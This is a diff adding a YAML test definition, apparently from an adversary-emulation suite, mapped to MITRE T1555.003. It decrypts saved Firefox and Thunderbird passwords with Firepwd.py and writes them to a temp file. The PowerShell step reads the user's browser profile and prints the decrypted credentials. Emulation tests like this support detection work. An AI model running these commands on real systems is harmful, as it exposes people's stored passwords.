@@ -1,0 +1,40 @@
+api_version: "2.0"
+name: Decrypt Mozilla Passwords with Firepwd.py
+description: "Firepwd.py is a script that can decrypt Mozilla (Thunderbird, Firefox) passwords.\nUpon successful execution, the decrypted credentials will be output to a text file, as well as displayed on screen. \n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n"
+args:
+    - name: venv_path
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004
+    - name: Firepwd_Path
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\venv_t1555.004\Scripts\Firepwd.py
+    - name: Out_Filepath
+      type: string
+      default: $env:temp\T1555.003Test8.txt
+    - name: VS_CMD_Path
+      type: string
+      default: C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat
+    - name: Python_Path
+      type: string
+      default: C:\Program Files\Python310\python.exe
+uuid: dc9cd677-c70f-4df5-bd1c-f114af3c2381
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1555: Credentials from Password Stores'
+    subtechniques:
+        - 'T1555.003: Credentials from Web Browsers'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: decrypt-mozilla-passwords-with-firepwd.py
+      inline: |
+        $PasswordDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+        cmd /c {{.Args.venv_path}}\Scripts\python.exe {{.Args.Firepwd_Path}} -d $PasswordDBLocation > {{.Args.Out_Filepath}}
+        cat {{.Args.Out_Filepath}}
+      executor: powershell
+      cleanup:
+        inline: "Remove-Item -Path \"{{.Args.Out_Filepath}}\" -erroraction silentlycontinue   \n"
+        executor: powershell
